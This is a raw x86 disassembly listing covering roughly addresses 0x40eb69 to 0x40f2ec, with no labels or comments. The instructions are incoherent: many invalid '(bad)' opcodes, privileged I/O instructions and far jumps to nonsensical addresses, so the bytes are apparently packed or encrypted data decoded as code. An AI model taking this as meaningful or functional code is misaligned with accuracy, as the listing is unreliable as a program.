  40eb69:	jp     0x40eb72
  40eb6b:	or     BYTE PTR [edx*2-0x44e034f8],0x84
  40eb73:	pop    esi
  40eb74:	shl    BYTE PTR [esi],1
  40eb76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb77:	sti    
  40eb78:	jnp    0x40eb7e
  40eb7a:	stc    
  40eb7b:	mov    ah,0x14
  40eb7d:	into   
  40eb7e:	mov    ds:0xfdc90598,al
  40eb83:	jnp    0x40ebcc
  40eb85:	les    edi,FWORD PTR [ecx+edi*2+0x44]
  40eb89:	test   al,0xde
  40eb8b:	push   ebx
  40eb8c:	mov    ebx,0xd18dcb36
  40eb91:	mov    dl,0x97
  40eb93:	(bad)  
  40eb95:	dec    eax
  40eb96:	sub    edx,ebp
  40eb98:	lock pop ebp
  40eb9a:	add    DWORD PTR [ebp-0x39ad3ff8],0xc6abe35c
  40eba4:	repnz fimul DWORD PTR [eax+0x3250e367]
  40ebab:	sbb    dh,cl
  40ebad:	test   eax,0x39e29e82
  40ebb2:	adc    esp,DWORD PTR [ebx+0x64]
  40ebb5:	xchg   DWORD PTR [esi-0x623112d3],eax
  40ebbb:	mov    edi,0xfed2aba
  40ebc0:	sub    al,0xd7
  40ebc2:	outs   dx,BYTE PTR ds:[esi]
  40ebc3:	int    0x68
  40ebc5:	test   al,0x1f
  40ebc7:	pop    es
  40ebc8:	stos   BYTE PTR es:[edi],al
  40ebc9:	xor    eax,0x29992630
  40ebce:	cmp    al,0xcb
  40ebd0:	xchg   DWORD PTR [esi-0x2a],edx
  40ebd3:	add    edi,DWORD PTR [eax]
  40ebd5:	adc    esp,DWORD PTR [esp+eax*8+0x4cd97bc1]
  40ebdc:	mov    ch,BYTE PTR [esi+0x6dd74ef4]
  40ebe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebe3:	out    dx,eax
  40ebe4:	inc    ebp
  40ebe5:	add    bh,dl
  40ebe7:	mov    ecx,0x49aecb24
  40ebec:	int3   
  40ebed:	add    eax,0x275efe61
  40ebf2:	mov    ds:0x36a9d76b,eax
  40ebf7:	out    0xf8,al
  40ebf9:	sahf   
  40ebfa:	cs call 0x5cbbc1ac
  40ec00:	add    al,0xc7
  40ec02:	sub    al,0x7c
  40ec04:	fsubr  QWORD PTR [ecx+0x271cbe70]
  40ec0a:	dec    edx
  40ec0b:	mov    ds:0xb473b86b,eax
  40ec10:	sbb    al,0x89
  40ec12:	out    dx,eax
  40ec13:	adc    edi,DWORD PTR [esp+eax*1-0x3be258a2]
  40ec1a:	inc    esi
  40ec1b:	stos   DWORD PTR es:[edi],eax
  40ec1c:	(bad)  
  40ec1d:	ins    DWORD PTR es:[edi],dx
  40ec1e:	adc    ah,BYTE PTR [edx-0xda81a25]
  40ec24:	mov    esp,0xfb6f15af
  40ec29:	add    ebx,esi
  40ec2b:	pop    ss
  40ec2c:	pushf  
  40ec2d:	das    
  40ec2e:	or     ch,bl
  40ec30:	popf   
  40ec31:	daa    
  40ec32:	sti    
  40ec33:	cmp    al,0xcd
  40ec35:	pcmpeqb mm4,mm0
  40ec38:	nop
  40ec39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec3a:	pop    esi
  40ec3b:	push   cs
  40ec3c:	sbb    ch,BYTE PTR [edi-0x5455408a]
  40ec42:	mov    ebx,0xa75c6c97
  40ec47:	and    bh,BYTE PTR [ebx-0x37]
  40ec4a:	add    esi,esp
  40ec4c:	xchg   esi,eax
  40ec4d:	xchg   ebp,eax
  40ec4e:	outs   dx,DWORD PTR ds:[esi]
  40ec4f:	in     al,dx
  40ec50:	jno    0x40ec2d
  40ec52:	iret   
  40ec53:	call   0xe4f72160
  40ec58:	mov    eax,0xe4361497
  40ec5d:	les    esi,FWORD PTR [eax-0x4a7f6ac1]
  40ec63:	call   0xe41c:0x74b74eb2
  40ec6a:	pop    ecx
  40ec6b:	mov    eax,ds:0x26bb3e25
  40ec70:	call   0xa49246ed
  40ec75:	pop    es
  40ec76:	inc    ebp
  40ec77:	stos   BYTE PTR es:[edi],al
  40ec78:	jp     0x40ec9a
  40ec7a:	cmp    dh,0x4a
  40ec7d:	xlat   BYTE PTR ds:[ebx]
  40ec7e:	mov    edx,edi
  40ec80:	loopne 0x40ec25
  40ec82:	je     0x40ec0d
  40ec84:	lock xor eax,0x79e9be7e
  40ec8a:	sbb    BYTE PTR [edi-0x39],bh
  40ec8d:	sbb    BYTE PTR [edx+0x78214aeb],dl
  40ec93:	jg     0x40ecd0
  40ec95:	aas    
  40ec96:	cmp    dh,bl
  40ec98:	imul   ecx,DWORD PTR ds:0xd2385fd6,0x68
  40ec9f:	int3   
  40eca0:	je     0x40ecdc
  40eca2:	inc    edi
  40eca3:	mov    esi,0x7364de6c
  40eca8:	mov    eax,0x90009d41
  40ecad:	lock cs mov bl,0x79
  40ecb1:	xchg   ebx,eax
  40ecb2:	ds mov ch,0x3b
  40ecb5:	lods   eax,DWORD PTR ds:[esi]
  40ecb6:	and    DWORD PTR [edx+0x18],edx
  40ecb9:	mov    ah,0x50
  40ecbb:	mov    ebp,0xa5fbc889
  40ecc0:	sub    DWORD PTR [ebx+0x59c6c69a],0x128625a1
  40ecca:	inc    esi
  40eccb:	ret    
  40eccc:	lea    eax,[edx+0x7a666766]
  40ecd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecd3:	inc    ecx
  40ecd4:	pop    ss
  40ecd5:	fadd   st(3),st
  40ecd7:	fld    st(2)
  40ecd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecda:	mov    es,WORD PTR [ecx+edx*2+0xd825f10]
  40ece1:	jl     0x40ec99
  40ece3:	outs   dx,DWORD PTR ds:[esi]
  40ece4:	retf   0xa64d
  40ece7:	(bad)  
  40ece8:	push   0x73
  40ecea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eceb:	or     al,0x2d
  40eced:	aad    0x51
  40ecef:	in     eax,dx
  40ecf0:	xor    WORD PTR [edi-0x25],cx
  40ecf4:	(bad)  
  40ecf5:	lea    ebx,[ecx-0x36]
  40ecf8:	dec    ebx
  40ecf9:	fild   DWORD PTR [ecx+0x12a432cb]
  40ecff:	add    eax,DWORD PTR ds:0xc1fb402
  40ed05:	mov    ebx,DWORD PTR [ebp+0x6666a29c]
  40ed0b:	es jno 0x40ecf6
  40ed0e:	pop    eax
  40ed0f:	fst    QWORD PTR [edx+0x647a9b6a]
  40ed15:	out    0xab,eax
  40ed17:	call   0xafeaefd7
  40ed1c:	sub    eax,0x2d9fa001
  40ed21:	cmp    eax,DWORD PTR [edi+0x4922d663]
  40ed27:	arpl   WORD PTR [edx+0x1c],bp
  40ed2a:	imul   ebx,DWORD PTR [ebx+0x78],0x6e64f7a1
  40ed31:	xor    esp,esi
  40ed33:	(bad)  
  40ed34:	mov    cl,0x59
  40ed36:	xor    al,0xaa
  40ed38:	in     eax,dx
  40ed39:	xor    ecx,DWORD PTR [esi+ecx*4]
  40ed3c:	mov    WORD PTR [ecx],fs
  40ed3e:	xchg   DWORD PTR [eax],edx
  40ed40:	rcr    esi,cl
  40ed42:	ds out dx,eax
  40ed44:	std    
  40ed45:	imul   ebx,edi,0x66907a3
  40ed4b:	cmp    BYTE PTR [ebx+0x73],bh
  40ed4e:	xchg   al,bl
  40ed50:	(bad)  
  40ed51:	pop    esi
  40ed52:	mov    cl,0x31
  40ed54:	out    0x34,al
  40ed56:	es nop
  40ed58:	out    dx,eax
  40ed59:	adc    BYTE PTR [eax+0x61],cl
  40ed5c:	fs std 
  40ed5e:	out    dx,eax
  40ed5f:	mov    eax,ds:0xf9644fe9
  40ed64:	push   ss
  40ed65:	sub    edx,ecx
  40ed67:	or     BYTE PTR [ebx],0xd3
  40ed6a:	jo     0x71caf15c
  40ed70:	je     0x40edb6
  40ed72:	xchg   ebx,eax
  40ed73:	dec    eax
  40ed74:	mov    esp,0xc15e88d
  40ed79:	out    0x5e,al
  40ed7b:	call   0x16eb:0x786a075e
  40ed82:	adc    esi,eax
  40ed84:	or     bl,BYTE PTR ds:0x817f4aa8
  40ed8a:	mov    edx,0xd0b24fd8
  40ed8f:	sahf   
  40ed90:	mov    esi,0x1cc62048
  40ed95:	pop    esp
  40ed96:	sbb    al,0x78
  40ed98:	dec    eax
  40ed99:	shl    BYTE PTR [ebx+esi*1-0x1c],cl
  40ed9d:	cld    
  40ed9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed9f:	and    BYTE PTR [edi],ah
  40eda1:	or     BYTE PTR [ebp+ebp*1+0x47],0xcd
  40eda6:	(bad)  
  40eda7:	adc    BYTE PTR ds:0xe325aa48,bl
  40edad:	xor    BYTE PTR [ebx],bh
  40edaf:	jmp    0x40ed7e
  40edb1:	jno    0x40ee29
  40edb3:	mov    edx,0x409cac5
  40edb8:	mov    ch,BYTE PTR [ebp+0x66475f5f]
  40edbe:	or     cl,ch
  40edc0:	test   BYTE PTR [eax-0x1d],dh
  40edc3:	mov    eax,0x5a3e0299
  40edc8:	and    ebx,DWORD PTR [edx+0x53a1141a]
  40edce:	dec    edx
  40edcf:	mov    al,ds:0x40de5c38
  40edd4:	inc    eax
  40edd5:	xchg   DWORD PTR [ecx-0x5b],ebx
  40edd8:	push   eax
  40edd9:	adc    al,0xaa
  40eddb:	xchg   edi,esp
  40eddd:	pop    bp
  40eddf:	mov    bl,0xaa
  40ede1:	cmp    eax,0xdea1163a
  40ede6:	and    eax,0x86e81784
  40edeb:	repnz rcr cl,0x81
  40edef:	inc    ebx
  40edf0:	fst    QWORD PTR [edi+0xa]
  40edf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edf4:	jb     0x40ee54
  40edf6:	sbb    al,ch
  40edf8:	rcr    bl,0x34
  40edfb:	sub    esp,ecx
  40edfd:	fs int3 
  40edff:	inc    esi
  40ee00:	adc    dh,dl
  40ee02:	inc    edi
  40ee03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee04:	cmp    esp,esp
  40ee06:	fcom   QWORD PTR [ebp+0x7a898598]
  40ee0c:	fimul  WORD PTR [ebx]
  40ee0e:	lahf   
  40ee0f:	fidiv  WORD PTR [eax-0x7f6aef8f]
  40ee15:	test   al,0x77
  40ee17:	retf   0x9d87
  40ee1a:	popfw  
  40ee1c:	sar    BYTE PTR [ecx],1
  40ee1e:	or     DWORD PTR [esi],0x468aadef
  40ee24:	loop   0x40ee9a
  40ee26:	xor    DWORD PTR [eax],ebx
  40ee28:	ror    DWORD PTR [ebx-0x17],1
  40ee2b:	mov    cl,0xb4
  40ee2d:	xchg   esp,eax
  40ee2e:	add    al,0x84
  40ee30:	sbb    eax,0x339a1c42
  40ee35:	daa    
  40ee36:	test   BYTE PTR [edi+0x29b7dea0],bh
  40ee3c:	jp     0x40eddc
  40ee3e:	in     al,0x12
  40ee40:	dec    ebx
  40ee41:	lods   al,BYTE PTR ds:[esi]
  40ee42:	inc    edi
  40ee43:	push   es
  40ee44:	push   ecx
  40ee45:	inc    ebp
  40ee46:	(bad)  
  40ee48:	jb     0x40ee6b
  40ee4a:	call   FWORD PTR [esp-0x17]
  40ee4e:	call   0xbcdd70b5
  40ee53:	jecxz  0x40edf7
  40ee55:	adc    esp,DWORD PTR [edi+0x7]
  40ee58:	iret   
  40ee59:	iret   
  40ee5a:	mov    ecx,0x81db8490
  40ee5f:	pop    es
  40ee60:	not    DWORD PTR [eax+0x39f1089e]
  40ee66:	imul   eax,esp,0x4
  40ee69:	into   
  40ee6a:	add    DWORD PTR [esi],esp
  40ee6c:	xchg   DWORD PTR [ebp+0x6406a38d],ebx
  40ee72:	mov    ch,ah
  40ee74:	out    0xf5,eax
  40ee76:	stos   DWORD PTR es:[edi],eax
  40ee77:	or     esi,DWORD PTR [ebx-0x4e701317]
  40ee7d:	stc    
  40ee7e:	push   ds
  40ee7f:	push   edi
  40ee80:	adc    BYTE PTR [ebp-0x34],0x26
  40ee84:	mov    esi,0x70d87c02
  40ee89:	jle    0x40eed1
  40ee8b:	leave  
  40ee8c:	mov    edi,?
  40ee8e:	mov    bl,0x25
  40ee90:	xor    eax,0x763c4dd7
  40ee95:	xchg   ebx,eax
  40ee96:	inc    ecx
  40ee97:	xchg   edi,eax
  40ee98:	das    
  40ee99:	dec    edi
  40ee9a:	jg     0x40eec7
  40ee9c:	lods   eax,DWORD PTR ds:[esi]
  40ee9d:	in     eax,0x8a
  40ee9f:	sub    al,0x4
  40eea1:	sub    ch,dh
  40eea3:	in     eax,0x0
  40eea5:	into   
  40eea6:	scas   al,BYTE PTR es:[edi]
  40eea7:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eea9:	loope  0x40ee46
  40eeab:	pop    esp
  40eeac:	out    0x7d,al
  40eeae:	dec    edi
  40eeaf:	mov    ch,0xc9
  40eeb1:	push   ss
  40eeb2:	mov    eax,ds:0xaa4994b4
  40eeb7:	cmp    DWORD PTR [ebp+0x3d],0x25
  40eebb:	adc    DWORD PTR [eax-0x60],esi
  40eebe:	mov    ch,0xeb
  40eec0:	mov    eax,ds:0x8e712222
  40eec5:	add    ebx,esi
  40eec7:	aam    0xd9
  40eec9:	iret   
  40eeca:	ffree  st(5)
  40eecc:	iret   
  40eecd:	add    bh,dl
  40eecf:	dec    edi
  40eed0:	dec    eax
  40eed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eed2:	(bad)
  40eed5:	test   eax,0xece6676f
  40eeda:	add    BYTE PTR [ebp+0x2f],ch
  40eedd:	cwde   
  40eede:	mov    dl,0xc9
  40eee0:	retf   0x6172
  40eee3:	jb     0x40eef3
  40eee5:	rol    BYTE PTR [esp+esi*1+0x40e2d062],0x70
  40eeed:	xor    edx,DWORD PTR [edx+0x26]
  40eef0:	jmp    0x70f13a17
  40eef5:	inc    eax
  40eef6:	in     eax,dx
  40eef7:	fist   DWORD PTR [esi+0x5f94682a]
  40eefd:	cmp    BYTE PTR [ebx+0x3a],ah
  40ef00:	sub    BYTE PTR [edx],0x6e
  40ef03:	xchg   edi,eax
  40ef04:	and    bl,BYTE PTR [edi+0x42]
  40ef07:	push   edx
  40ef08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef09:	inc    edx
  40ef0a:	ret    
  40ef0b:	shl    DWORD PTR [eax+0x10e2c6a3],cl
  40ef11:	sbb    DWORD PTR [esi+0x5ee310f3],ebx
  40ef17:	mov    bl,0x33
  40ef19:	ret    0x5ef9
  40ef1c:	(bad)  
  40ef1e:	push   esi
  40ef1f:	mov    ds:0xffcffb29,eax
  40ef24:	sub    eax,ebx
  40ef26:	cli    
  40ef27:	mov    ecx,ds
  40ef29:	fisttp WORD PTR [ebp-0x75]
  40ef2c:	mov    esi,0x4db92990
  40ef31:	call   0xa9beb347
  40ef36:	ficom  DWORD PTR [esi-0x78]
  40ef39:	and    dh,ch
  40ef3b:	and    eax,0xa93ecbdd
  40ef40:	fnstcw WORD PTR [edi-0x3b3dbd02]
  40ef46:	(bad)  
  40ef48:	pop    ds
  40ef49:	mov    al,ds:0xac5b1c79
  40ef4e:	cmp    al,BYTE PTR [esi-0x5b]
  40ef51:	(bad)  
  40ef52:	repz in al,dx
  40ef54:	fwait
  40ef55:	sbb    al,0x71
  40ef57:	inc    esp
  40ef58:	mov    esi,0xd773dca8
  40ef5d:	cmp    DWORD PTR [eax-0x534806a2],0x6041411e
  40ef67:	retf   
  40ef68:	iret   
  40ef69:	cld    
  40ef6a:	mov    gs,WORD PTR [esi+ecx*4+0x7f]
  40ef6e:	and    al,0x4f
  40ef70:	fsub   QWORD PTR [ecx-0x7eee5c89]
  40ef76:	into   
  40ef77:	mov    ch,0xd0
  40ef79:	scas   al,BYTE PTR es:[edi]
  40ef7a:	div    DWORD PTR [edi-0x4]
  40ef7d:	fisttp QWORD PTR [edx-0x22]
  40ef80:	pusha  
  40ef81:	jno    0x40ef9d
  40ef83:	lds    eax,FWORD PTR [edi]
  40ef85:	fstp   TBYTE PTR [eax-0x9]
  40ef88:	(bad)  
  40ef89:	cmp    bh,BYTE PTR [esi+0x4b]
  40ef8c:	push   edx
  40ef8d:	in     eax,0x94
  40ef8f:	sub    eax,0x87a18129
  40ef94:	shl    DWORD PTR [ebx-0x40],0xa6
  40ef98:	jne    0x40ef75
  40ef9a:	repz loopne 0x40efba
  40ef9d:	int    0xb9
  40ef9f:	cmp    edx,DWORD PTR [ecx+0x50]
  40efa2:	in     eax,dx
  40efa3:	sti    
  40efa4:	ins    DWORD PTR es:[edi],dx
  40efa5:	ins    DWORD PTR es:[edi],dx
  40efa6:	inc    eax
  40efa7:	push   ds
  40efa8:	mov    esi,0x2bdd4d82
  40efad:	inc    ebp
  40efae:	(bad)  
  40efb0:	icebp  
  40efb1:	sub    BYTE PTR [ebp+0x2d],bh
  40efb4:	pop    es
  40efb5:	adc    BYTE PTR [ebp+0x500f7fdd],al
  40efbb:	and    esi,esi
  40efbd:	sahf   
  40efbe:	jo     0x40ef81
  40efc0:	lea    ebx,[edi+esi*4+0x71]
  40efc4:	fsubr  QWORD PTR [ecx-0x3f5d72a6]
  40efca:	xchg   ebp,eax
  40efcb:	repnz mov ah,0xe8
  40efce:	int3   
  40efcf:	int3   
  40efd0:	cmp    BYTE PTR [ebx+0x331ea55b],al
  40efd6:	ds out dx,al
  40efd8:	xor    esp,DWORD PTR [ecx+ebx*1+0x4a]
  40efdc:	lods   eax,DWORD PTR ds:[esi]
  40efdd:	int    0xd3
  40efdf:	fisubr DWORD PTR es:[eax]
  40efe2:	shl    BYTE PTR [esi],1
  40efe4:	mov    esp,ds
  40efe6:	cmp    eax,0x506b4c82
  40efeb:	pusha  
  40efec:	jg     0x40f05f
  40efee:	lods   al,BYTE PTR ds:[esi]
  40efef:	cmp    esp,eax
  40eff1:	dec    ecx
  40eff2:	sub    DWORD PTR [ecx+esi*2],esp
  40eff5:	push   ecx
  40eff6:	jle    0x40ef7d
  40eff8:	call   0xb6d9ef8
  40effd:	jnp    0x40f065
  40efff:	fwait
  40f000:	retf   
  40f001:	mov    esi,0x7702ee71
  40f006:	iret   
  40f007:	adc    al,0xf7
  40f009:	xchg   dh,cl
  40f00b:	add    ebp,esi
  40f00d:	cld    
  40f00e:	jbe    0x40f06f
  40f010:	sbb    ecx,DWORD PTR [ebx-0x1d]
  40f013:	jbe    0x40f06f
  40f015:	pop    esi
  40f016:	and    al,0xe3
  40f018:	cmc    
  40f019:	pop    edi
  40f01a:	xchg   ebx,eax
  40f01b:	cmp    eax,0xcb156c76
  40f020:	mul    BYTE PTR ds:0xa694e0e5
  40f026:	sub    DWORD PTR [ecx-0x3c],esp
  40f029:	dec    ebx
  40f02a:	dec    ebp
  40f02b:	in     al,0xb8
  40f02d:	push   cs
  40f02e:	sub    ah,BYTE PTR [edx+ecx*1+0x7109e4fc]
  40f035:	dec    esi
  40f036:	icebp  
  40f037:	rcl    BYTE PTR [ecx-0x39c3eac3],0x4d
  40f03e:	pop    es
  40f03f:	pop    ds
  40f040:	icebp  
  40f041:	xor    al,0x41
  40f043:	pop    ss
  40f044:	(bad)  
  40f045:	outs   dx,BYTE PTR ds:[esi]
  40f046:	inc    ebx
  40f047:	mov    bh,ah
  40f049:	fld    st(0)
  40f04b:	push   0x1f
  40f04d:	sbb    BYTE PTR [esi+ebp*1+0x4b],bh
  40f051:	(bad)  
  40f052:	pop    esi
  40f053:	sub    eax,0xc08f49cb
  40f058:	pop    ebp
  40f059:	out    dx,eax
  40f05a:	cmp    al,0xd6
  40f05c:	out    0xa7,al
  40f05e:	aam    0x4d
  40f060:	les    ebp,FWORD PTR [edx]
  40f062:	xchg   edi,eax
  40f063:	fucomi st,st(2)
  40f065:	outs   dx,DWORD PTR ds:[esi]
  40f066:	jmp    0x8918066b
  40f06b:	adc    eax,0xbe980806
  40f070:	adc    eax,0x46
  40f073:	jb     0x40f04d
  40f075:	mov    DWORD PTR [ebx-0x50c6cb2a],ecx
  40f07b:	neg    DWORD PTR [ebx+0x64]
  40f07e:	shl    DWORD PTR [edi-0x4e],cl
  40f081:	xor    esp,DWORD PTR [ebp-0x2b]
  40f084:	jge    0x40f052
  40f086:	imul   eax,ebx,0x5da31d00
  40f08c:	pop    eax
  40f08d:	(bad)  
  40f08e:	repz (bad) 
  40f090:	out    dx,al
  40f091:	pop    es
  40f092:	jno    0x40f072
  40f094:	das    
  40f095:	fidiv  WORD PTR [ecx-0x3f7c9f51]
  40f09b:	iret   
  40f09c:	shl    BYTE PTR [ebx+edi*4+0x3b288dfd],0xa3
  40f0a4:	or     al,0xa0
  40f0a6:	hlt    
  40f0a7:	loope  0x40f0bb
  40f0a9:	retf   
  40f0aa:	in     eax,dx
  40f0ab:	and    dh,dl
  40f0ad:	mov    dh,BYTE PTR [edx]
  40f0af:	jno    0x40f107
  40f0b1:	bound  ecx,QWORD PTR [eax+0x5d041cc8]
  40f0b7:	dec    ecx
  40f0b8:	lds    ecx,FWORD PTR [ebx+0x8]
  40f0bb:	(bad)  
  40f0bc:	push   ecx
  40f0bd:	leave  
  40f0be:	mov    ch,0xf9
  40f0c0:	or     esi,ecx
  40f0c2:	(bad)  
  40f0c3:	or     DWORD PTR [ebp+ebp*8-0x36],esi
  40f0c7:	sbb    dl,ah
  40f0c9:	add    eax,0xa212128b
  40f0ce:	call   0x1ec49b8f
  40f0d3:	ja     0x40f0ce
  40f0d5:	fsubr  DWORD PTR [ebp+eiz*2-0xcf570a8]
  40f0dc:	sub    al,0xbe
  40f0de:	xor    eax,0xbc58deae
  40f0e3:	call   0x77abf810
  40f0e8:	test   al,0x2e
  40f0ea:	jge    0x40f11c
  40f0ec:	adc    eax,0x356bf656
  40f0f1:	bound  esi,QWORD PTR [ebp-0x316486c1]
  40f0f7:	mov    BYTE PTR [edx],dh
  40f0f9:	push   0x44e62a74
  40f0fe:	mov    ebp,0xd4124588
  40f103:	add    bh,dl
  40f105:	iret   
  40f106:	imul   bl
  40f108:	pop    ss
  40f109:	add    eax,0x79f88c37
  40f10e:	pop    ebp
  40f10f:	inc    ebx
  40f110:	mov    al,0x87
  40f112:	ror    esp,0xd4
  40f115:	icebp  
  40f116:	cld    
  40f117:	fdivr  st,st(3)
  40f119:	and    eax,0x74a01984
  40f11e:	xchg   esp,eax
  40f11f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f120:	adc    BYTE PTR [edx+ebp*1+0x57],al
  40f124:	mov    dh,0x73
  40f126:	aaa    
  40f127:	aam    0x7d
  40f129:	jnp    0x40f18a
  40f12b:	push   ss
  40f12c:	inc    edi
  40f12d:	iret   
  40f12e:	pop    ecx
  40f12f:	in     eax,0xf3
  40f131:	cmp    BYTE PTR [edx+0x4805e1ff],0xb0
  40f138:	xchg   esp,eax
  40f139:	(bad)  
  40f13a:	(bad)  
  40f13b:	push   0x4a
  40f13d:	jns    0x40f0ef
  40f13f:	lea    esp,[eax]
  40f141:	pushf  
  40f142:	sub    al,cl
  40f144:	aas    
  40f145:	arpl   WORD PTR [edi+0x3f],ax
  40f148:	pop    ss
  40f149:	sbb    DWORD PTR [esi+0x4247f9a],esp
  40f14f:	and    ch,BYTE PTR [ebx]
  40f151:	inc    edi
  40f152:	jo     0x40f1a7
  40f154:	inc    ecx
  40f155:	or     DWORD PTR [ebx],ebx
  40f157:	jb     0x40f124
  40f159:	iret   
  40f15a:	inc    esi
  40f15b:	mov    ds:0x73fdcdeb,al
  40f160:	xor    esi,edi
  40f162:	mov    esi,0x600f3cc6
  40f167:	mov    edx,0x742a7fa1
  40f16c:	loope  0x40f1c7
  40f16e:	repnz mov cl,0x66
  40f171:	shr    DWORD PTR [edx+0x2c],cl
  40f174:	push   ss
  40f175:	das    
  40f176:	lock scas eax,DWORD PTR es:[edi]
  40f178:	scas   al,BYTE PTR es:[edi]
  40f179:	lds    ebx,FWORD PTR [ecx]
  40f17b:	popf   
  40f17c:	ja     0x40f1cd
  40f17e:	icebp  
  40f17f:	jb     0x40f103
  40f181:	xor    cl,BYTE PTR [esi]
  40f183:	inc    DWORD PTR [ebp+edi*1-0x58]
  40f187:	jmp    0xbaf3:0x3aa253e8
  40f18e:	cmp    al,0x81
  40f190:	jmp    0x40f17b
  40f192:	outs   dx,DWORD PTR ds:[esi]
  40f193:	cld    
  40f194:	stc    
  40f195:	adc    BYTE PTR [esi],dh
  40f197:	ror    BYTE PTR [esi],cl
  40f199:	push   es
  40f19a:	mov    esp,0xc513751a
  40f19f:	sbb    DWORD PTR [ecx],ebx
  40f1a1:	adc    cl,ch
  40f1a3:	js     0x40f1d8
  40f1a5:	retf   
  40f1a6:	pop    es
  40f1a7:	fnstsw WORD PTR [esi-0x351c5dc1]
  40f1ad:	jb     0x40f1f5
  40f1af:	xchg   edi,eax
  40f1b0:	aaa    
  40f1b1:	ja     0x40f1b0
  40f1b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1b4:	shl    DWORD PTR ds:0x5060da5a,0x29
  40f1bb:	and    BYTE PTR ds:0xb88213bd,0x46
  40f1c2:	jl     0x40f1f1
  40f1c4:	mov    ah,0xf
  40f1c6:	dec    esp
  40f1c7:	mov    edi,0xf4fd3d13
  40f1cc:	scas   eax,DWORD PTR es:[edi]
  40f1cd:	mov    ebx,0xf2e859e7
  40f1d2:	cs push es
  40f1d4:	ins    DWORD PTR es:[edi],dx
  40f1d5:	dec    eax
  40f1d6:	daa    
  40f1d7:	jo     0x40f208
  40f1d9:	and    al,0x84
  40f1db:	fldenv [ecx-0x7f3fa910]
  40f1e1:	and    BYTE PTR [ecx-0x59715e21],dh
  40f1e7:	nop
  40f1e8:	push   0xfc390984
  40f1ed:	loop   0x40f173
  40f1ef:	popa   
  40f1f0:	repnz add al,0xe6
  40f1f3:	nop
  40f1f4:	cmp    eax,0xf94626d5
  40f1f9:	cmp    al,0xf8
  40f1fb:	sbb    DWORD PTR [edi+0x5c],esp
  40f1fe:	dec    esi
  40f1ff:	push   ss
  40f200:	xlat   BYTE PTR ds:[ebx]
  40f201:	inc    DWORD PTR [edx]
  40f203:	sub    edi,DWORD PTR [edi+esi*2+0x20]
  40f207:	mov    dl,0xb8
  40f209:	push   ebp
  40f20a:	iret   
  40f20b:	and    BYTE PTR [esi+eiz*2],al
  40f20e:	sub    BYTE PTR [edi-0x2c056aa8],0xfb
  40f215:	jg     0x40f1e2
  40f217:	push   esp
  40f218:	and    eax,esp
  40f21a:	pushf  
  40f21b:	mov    ds:0x87b78f3b,al
  40f220:	adc    BYTE PTR [eax*4-0x27855a1],0xee
  40f228:	je     0x40f1c0
  40f22a:	outs   dx,DWORD PTR ds:[esi]
  40f22b:	test   al,0x8a
  40f22d:	jmp    0x40f22c
  40f22f:	in     eax,dx
  40f230:	pop    ds
  40f231:	lods   al,BYTE PTR ds:[esi]
  40f232:	adc    DWORD PTR [ecx+0x6a62032b],esi
  40f238:	dec    ecx
  40f239:	ficomp DWORD PTR [eax+eax*1]
  40f23c:	lods   al,BYTE PTR ds:[esi]
  40f23d:	inc    edi
  40f23e:	and    DWORD PTR [esi-0x7e],esp
  40f241:	jbe    0x40f216
  40f243:	adc    edi,DWORD PTR [edi+0x76]
  40f246:	pop    eax
  40f247:	inc    edx
  40f248:	lea    esp,[edx]
  40f24a:	cmp    BYTE PTR [ecx-0x22],0x21
  40f24e:	dec    eax
  40f24f:	fcomip st,st(5)
  40f251:	shl    DWORD PTR [edx-0x20],cl
  40f254:	jl     0x40f1e0
  40f256:	pusha  
  40f257:	outs   dx,DWORD PTR ds:[esi]
  40f258:	jp     0x40f28a
  40f25a:	fnstsw WORD PTR gs:[edi+0x5c8ed967]
  40f261:	adc    esp,DWORD PTR [ebx-0x10209be]
  40f267:	(bad)  
  40f269:	jmp    0x46e:0xf6ee0313
  40f270:	dec    esp
  40f271:	(bad)  
  40f272:	je     0x40f21b
  40f274:	stos   BYTE PTR es:[edi],al
  40f275:	stos   DWORD PTR es:[edi],eax
  40f276:	and    dl,BYTE PTR [edx+0x29]
  40f279:	ror    BYTE PTR ds:0x2b807131,1
  40f27f:	sub    dh,al
  40f281:	dec    esp
  40f282:	xchg   dx,ax
  40f284:	mov    ecx,0xd84c033b
  40f289:	jecxz  0x40f249
  40f28b:	repz scas al,BYTE PTR es:[edi]
  40f28d:	in     eax,dx
  40f28e:	cs repz (bad) 
  40f291:	fxch   st(1)
  40f293:	and    dh,ch
  40f295:	into   
  40f296:	loop   0x40f23e
  40f298:	or     BYTE PTR [eax+ebx*4-0x18bfef93],dh
  40f29f:	push   es
  40f2a0:	adc    BYTE PTR [esi+ebp*4+0x28],dl
  40f2a4:	adc    ah,BYTE PTR [ecx+eiz*1-0x10]
  40f2a8:	lock mov bl,0xf9
  40f2ab:	mov    dh,0x4a
  40f2ad:	cs dec eax
  40f2af:	in     al,0x54
  40f2b1:	cmp    eax,0xa4c35839
  40f2b6:	rcr    cl,cl
  40f2b8:	and    bh,BYTE PTR [edx+edi*2]
  40f2bb:	pop    ds
  40f2bc:	fsubr  DWORD PTR [edi+0x16]
  40f2bf:	fmul   st,st(0)
  40f2c1:	sub    eax,0xc20cd64d
  40f2c6:	dec    eax
  40f2c7:	mov    ebx,0x50bbc8c9
  40f2cc:	add    ebp,DWORD PTR [edi-0x4dd44c99]
  40f2d2:	fimul  WORD PTR [esi-0x6cdaf3b4]
  40f2d8:	retf   
  40f2d9:	es mov eax,0xae2200a4
  40f2df:	addr16 mov cl,0xd3
  40f2e2:	push   es
  40f2e3:	sub    al,0x42
  40f2e5:	adc    esp,DWORD PTR [edx-0x5d3bc217]
  40f2eb:	(bad)  
  40f2ec:	lods   al,BYTE PTR ds:[esi]
